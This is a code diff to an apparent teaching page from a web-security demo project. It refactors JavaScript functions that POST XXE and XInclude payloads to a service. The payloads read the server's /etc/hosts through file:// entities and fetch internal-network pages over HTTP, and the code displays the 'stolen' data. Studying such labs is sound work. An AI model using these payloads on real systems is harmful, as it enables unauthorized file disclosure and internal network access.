@@ -33,8 +33,9 @@
 <ul>
     <li><a href="javascript:useXxeToGetLocalFile_01()">Use XXE 1 - get local file</a></li>
     <li><a href="javascript:useXxeToGetHttpFileFromInternalNetwork_01()">Use XXE 2 - get internal network XML by HTTP</a></li>
-    <li><a href="javascript:useXxeToGetHttpFileFromInternalNetwork_02()">Use XXE 3 - try to get data non-compatible with XML by HTTP (will <b>FAIL</b>)</a></li>
-    <br/>
+    <li><a href="javascript:useXxeToGetHttpFileFromInternalNetwork_02()">Use XXE 3 - try to get data non-compatible with XML by HTTP (will <b>FAIL</b>)</a>
+        <br/><br/></li>
+
     <li><a href="javascript:useXIncludeToGetLocalFile_01()">Use XInclude 1 - get local file</a></li>
     <li><a href="javascript:useXIncludeToGetHttpFileFromInternalNetwork_01()">Use XInclude 1 - get internal network XML by HTTP</a></li>
     <li><a href="javascript:useXIncludeToGetHttpFileFromInternalNetwork_02()">Use XInclude 1 - get internal network non-XML by HTTP <b>(SUCCESS)</b></a></li>
@@ -53,48 +54,53 @@
         }
     }
 
+    const serverFile = "/etc/hosts"
+    const serverFileUrl = "file://" + serverFile
+    const someInternalXmlHttp = "http://localhost:8080/web-security-holes-01/internal/some-internal-xml-data.jsp"
+    const someInternalNonXmlHttp = "http://localhost:8080/web-security-holes-01/internal/some-internal-nonvalid-xml-data.jsp"
+
 
     function useXxeToGetLocalFile_01() {
         const req = new XMLHttpRequest();
-        req.addEventListener("load", () => alert("See stolen /etc/hosts\n" + req.responseText));
+        req.addEventListener("load", () => alert("See stolen " + serverFile + "\n" + req.responseText));
         req.open("POST", serviceEndPointUrl());
         // <%--suppress UnnecessaryUnicodeEscape --%>
         req.send(
-            //'<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:/etc/hosts"> ]>' +
-            '<\u0021DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:/etc/hosts"> ]>' +
+            //'<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "' + serverFileUrl + '"> ]>' +
+            '<\u0021DOCTYPE foo [ <!ENTITY xxe SYSTEM "' + serverFileUrl + '"> ]>' +
             '<transfer><amount>&xxe;</amount></transfer>');
     }
 
     function useXxeToGetHttpFileFromInternalNetwork_01() {
         const req = new XMLHttpRequest();
-        req.addEventListener("load", () => alert("See stolen /etc/hosts\n" + req.responseText));
+        req.addEventListener("load", () => alert("See stolen internal network file\n" + req.responseText));
         req.open("POST", serviceEndPointUrl());
         // <%--suppress UnnecessaryUnicodeEscape --%>
         req.send(
-            //   '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://localhost:8080/secur_app_01_war_exploded/internal/some-internal-xml-data.jsp"> ]>' +
-            '<\u0021DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://localhost:8080/secur_app_01_war_exploded/internal/some-internal-xml-data.jsp"> ]>' +
+            //   '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "' + someInternalXmlHttp + '"> ]>' +
+            '<\u0021DOCTYPE foo [ <!ENTITY xxe SYSTEM "' + someInternalXmlHttp + '"> ]>' +
             '<transfer><amount>&xxe;</amount></transfer>');
     }
 
     function useXxeToGetHttpFileFromInternalNetwork_02() {
         const req = new XMLHttpRequest();
-        req.addEventListener("load", () => alert("See stolen /etc/hosts\n" + req.responseText));
+        req.addEventListener("load", () => alert("See stolen internal network file\n" + req.responseText));
         req.open("POST", serviceEndPointUrl());
         // <%--suppress UnnecessaryUnicodeEscape --%>
         req.send(
-            //   '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://localhost:8080/secur_app_01_war_exploded/internal/some-internal-nonvalid-xml-data.jsp"> ]>' +
-            '<\u0021DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://localhost:8080/secur_app_01_war_exploded/internal/some-internal-nonvalid-xml-data.jsp"> ]>' +
+            //   '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "' + someInternalNonXmlHttp + '"> ]>' +
+            '<\u0021DOCTYPE foo [ <!ENTITY xxe SYSTEM "' + someInternalNonXmlHttp + '"> ]>' +
             '<transfer><amount>&xxe;</amount></transfer>');
     }
 
     function useXIncludeToGetLocalFile_01() {
         const req = new XMLHttpRequest();
-        req.addEventListener("load", () => alert("See stolen /etc/hosts\n" + req.responseText));
+        req.addEventListener("load", () => alert("See stolen " + serverFile + "\n" + req.responseText));
         req.open("POST", serviceEndPointUrl());
         // <%--suppress UnnecessaryUnicodeEscape --%>
         const xml =
             '<transfer>' +
-            '  <amount><include xmlns="http://www.w3.org/2001/XInclude" href="file:///etc/hosts" parse="text"/></amount>' +
+            '  <amount><include xmlns="http://www.w3.org/2001/XInclude" href="' + serverFileUrl + '" parse="text"/></amount>' +
             '</transfer>'
 
         req.send(xml);
@@ -102,12 +108,12 @@
 
     function useXIncludeToGetHttpFileFromInternalNetwork_01() {
         const req = new XMLHttpRequest();
-        req.addEventListener("load", () => alert("See stolen /etc/hosts\n" + req.responseText));
+        req.addEventListener("load", () => alert("See stolen internal server file\n" + req.responseText));
         req.open("POST", serviceEndPointUrl());
         // <%--suppress UnnecessaryUnicodeEscape --%>
         const xml =
             '<transfer>' +
-            '  <amount><include xmlns="http://www.w3.org/2001/XInclude" href="http://localhost:8080/secur_app_01_war_exploded/internal/some-internal-xml-data.jsp" parse="text"/></amount>' +
+            '  <amount><include xmlns="http://www.w3.org/2001/XInclude" href="' + someInternalXmlHttp + '" parse="text"/></amount>' +
             '</transfer>'
 
         req.send(xml);
@@ -115,12 +121,12 @@
 
     function useXIncludeToGetHttpFileFromInternalNetwork_02() {
         const req = new XMLHttpRequest();
-        req.addEventListener("load", () => alert("See stolen /etc/hosts\n" + req.responseText));
+        req.addEventListener("load", () => alert("See stolen internal server file\n" + req.responseText));
         req.open("POST", serviceEndPointUrl());
         // <%--suppress UnnecessaryUnicodeEscape --%>
         const xml =
             '<transfer>' +
-            '  <amount><include xmlns="http://www.w3.org/2001/XInclude" href="http://localhost:8080/secur_app_01_war_exploded/internal/some-internal-nonvalid-xml-data.jsp" parse="text"/></amount>' +
+            '  <amount><include xmlns="http://www.w3.org/2001/XInclude" href="' + someInternalNonXmlHttp + '" parse="text"/></amount>' +
             '</transfer>'
 
         req.send(xml);
